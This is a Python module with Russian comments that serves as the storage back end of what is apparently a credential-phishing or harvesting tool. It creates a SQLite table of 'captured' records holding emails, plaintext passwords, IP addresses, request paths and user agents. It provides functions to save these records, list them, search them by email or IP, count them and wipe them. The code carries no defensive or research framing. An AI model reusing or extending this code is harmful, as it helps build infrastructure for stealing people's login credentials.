import os
import sqlite3
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional

# === ПУТЬ К БД ===
# Переменная окружения DB_PATH (например, /app/data/captured.db) или по умолчанию рядом со скриптом
DB_PATH = Path(os.getenv('DB_PATH', str(Path(__file__).parent / "captured.db")))

def init_db() -> None:
    """
    Создаёт таблицу captures, если её нет.
    Также автоматически создаёт папку для базы данных.
    """
    # Создаём директорию для БД, если её нет (например, ./data)
    try:
        DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"[DB] ⚠️ Не удалось создать папку: {e}")

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Основная таблица с данными перехвата
        c.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                email TEXT,
                password TEXT,
                ip TEXT,
                path TEXT,
                user_agent TEXT,
                full_data TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # Индексы для быстрого поиска по email и времени
        c.execute('CREATE INDEX IF NOT EXISTS idx_email ON captures (email)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON captures (timestamp)')
        # Добавляем индекс для поиска по IP (на всякий случай)
        c.execute('CREATE INDEX IF NOT EXISTS idx_ip ON captures (ip)')

        conn.commit()
        conn.close()
        print(f"[DB] ✅ База данных инициализирована: {DB_PATH}")
    except Exception as e:
        print(f"[DB] ❌ Ошибка инициализации БД: {e}")

def save_capture(data: Dict[str, Any]) -> bool:
    """
    Сохраняет перехваченные данные в таблицу captures.
    Возвращает True при успехе.
    """
    try:
        # Проверяем, существует ли БД (если нет — создаём)
        if not DB_PATH.exists():
            init_db()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Извлекаем основные поля из словаря, подставляя значения по умолчанию
        timestamp = datetime.now().isoformat()
        email = data.get('email', 'не указан')
        password = data.get('password', 'не указан')
        ip = data.get('ip', 'unknown')
        path = data.get('path', 'unknown')
        user_agent = data.get('user_agent', 'unknown')
        full_data = json.dumps(data, ensure_ascii=False)

        c.execute('''
            INSERT INTO captures (
                timestamp, email, password, ip, path, user_agent, full_data
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (timestamp, email, password, ip, path, user_agent, full_data))

        conn.commit()
        conn.close()
        print(f"[DB] 💾 Сохранено: {email} | {ip} | {path}")
        return True

    except sqlite3.OperationalError as e:
        print(f"[DB] ❌ Ошибка SQLite: {e}")
        # Пробуем повторно инициализировать БД
        try:
            init_db()
            # Повторная попытка сохранения через рекурсию, но с флагом, чтобы избежать зацикливания
            return save_capture(data)
        except:
            return False
    except Exception as e:
        print(f"[DB] ❌ Неизвестная ошибка: {e}")
        return False

def get_all_captures(limit: int = 100) -> List[tuple]:
    """
    Возвращает последние записи (не более limit).
    """
    try:
        if not DB_PATH.exists():
            return []

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            SELECT id, timestamp, email, password, ip, path, created_at
            FROM captures
            ORDER BY id DESC
            LIMIT ?
        ''', (limit,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"[DB] ❌ Ошибка получения записей: {e}")
        return []

def get_by_email(email: str) -> List[tuple]:
    """
    Ищет записи, где email содержит подстроку (регистронезависимо).
    """
    try:
        if not DB_PATH.exists():
            return []

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            SELECT id, timestamp, email, password, ip, path, created_at
            FROM captures
            WHERE email LIKE ?
            ORDER BY id DESC
        ''', (f'%{email}%',))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"[DB] ❌ Ошибка поиска: {e}")
        return []

def get_by_ip(ip: str) -> List[tuple]:
    """
    Ищет записи по IP (точное совпадение или частичное).
    """
    try:
        if not DB_PATH.exists():
            return []

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            SELECT id, timestamp, email, password, ip, path, created_at
            FROM captures
            WHERE ip LIKE ?
            ORDER BY id DESC
        ''', (f'%{ip}%',))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"[DB] ❌ Ошибка поиска по IP: {e}")
        return []

def count_captures() -> int:
    """Возвращает общее количество записей в таблице."""
    try:
        if not DB_PATH.exists():
            return 0

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM captures')
        count = c.fetchone()[0]
        conn.close()
        return count
    except Exception as e:
        print(f"[DB] ❌ Ошибка подсчёта: {e}")
        return 0

def clear_captures(confirm: bool = False) -> None:
    """
    Очищает таблицу captures.
    Для безопасности требуется явное подтверждение.
    """
    if not confirm:
        print("[DB] ⚠️ Для очистки таблицы вызови clear_captures(confirm=True)")
        return

    try:
        if not DB_PATH.exists():
            return

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('DELETE FROM captures')
        conn.commit()
        conn.close()
        print("[DB] 🧹 Таблица captures полностью очищена")
    except Exception as e:
        print(f"[DB] ❌ Ошибка очистки: {e}")

# === ОТЛАДОЧНАЯ ФУНКЦИЯ ===
def print_captures(limit: int = 5) -> None:
    """
    Красиво печатает последние записи в консоль.
    """
    rows = get_all_captures(limit)
    if not rows:
        print("📭 Записей пока нет")
        return

    print(f"\n📋 Последние {len(rows)} записей из {count_captures()}:\n")
    print("─" * 80)
    for row in rows:
        print(f"ID: {row[0]} | {row[1]} | {row[2]} | {row[3]}")
    print("─" * 80)

if __name__ == "__main__":
    # Если файл запущен напрямую — инициализируем БД и показываем записи
    init_db()
    print_captures()